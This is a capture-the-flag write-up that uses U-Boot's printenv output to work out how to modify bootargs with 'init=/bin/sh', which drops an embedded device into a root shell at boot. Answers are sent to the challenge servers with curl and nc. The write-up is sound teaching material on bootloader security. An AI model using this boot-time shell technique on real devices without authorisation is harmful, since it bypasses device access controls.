# Baby's First IoT Part 4

## Description
See introduction for complete context.

- Part 3 - Submit the command used in U-Boot to look at the system variables to port 1337 as a GET request ex. http://35.225.17.48:1337/{command}. This output is needed for another challenge. **There is NO flag for this part.**
- Part 4 – Submit the full command you would use in U-Boot to set the proper environment variable to a /bin/sh process upon boot to get the flag on the webserver at port 7777. Do not include the ‘bootcmd’ command. It will be in the format of "something something=${something} something=something" Submit the answer on port 9123.

## Solution
The first step to working on part 4 is to get the system environment variable in U-Boot. [U-Boot](https://github.com/u-boot/u-boot) is an open-source Universal Boot Loader used to boot the Linux kernel on devices with ARM architecture or embedded devices.

In part 3, we need to run a command on U-Boot to show system variables. 
There is no flag in part 3, but we could get some informations for part 4. 
To get this information we can run the following command.

```shell
curl http://35.225.17.48:1337/printenv
```

The result is something like this.

```
addmisc=setenv bootargs ${bootargs}console=ttyS0,${baudrate}panic=1
baudrate=57600
bootaddr=(0xBC000000 + 0x1e0000)
bootargs=console=ttyS1,57600 root=/dev/mtdblock8 rts_hconf.hconf_mtd_idx=0 mtdparts=m25p80:256k(boot),128k(pib),1024k(userdata),128k(db),128k(log),128k(dbbackup),128k(logbackup),3072k(kernel),11264k(rootfs)
bootcmd=bootm 0xbc1e0000
bootfile=/vmlinux.img
ethact=r8168#0
ethaddr=00:00:00:00:00:00
load=tftp 80500000 ${u-boot}
loadaddr=0x82000000
stderr=serial
stdin=serial
stdout=serial

Environment size: 533/131068 bytes
```

The printenv command here is used to display system environment variables or UEFI variables. You can check the documentation of U-Boot in these links: [Link 1](https://docs.u-boot.org/en/latest/usage/index.html#shell-commands), [Link 2](https://hub.digi.com/dp/path=/support/asset/u-boot-reference-manual/)

From this information, there is a line that sets the environment variable for bootargs.

```
addmisc=setenv bootargs ${bootargs}console=ttyS0,${baudrate}panic=1
```

The line sets console=ttyS0 with baudrate information on the next line. From this information we can assume the correct command for part 4 is:

```
setenv bootargs ${bootargs} init=/bin/sh
```

The above command should be the correct for setting /bin/sh process upon boot. But from the description of part 4, the command must have this format "something something=${something} something=something". So the correct answer for part 4 is like this:

```
setenv bootargs=${bootargs} init=/bin/sh
```

To send a message to the netcat server, use the following command:

```shell
printf 'setenv bootargs=${bootargs} init=/bin/sh\n\0' | nc 35.225.17.48 9123
```

## Flag
`{Uboot_Hacking}`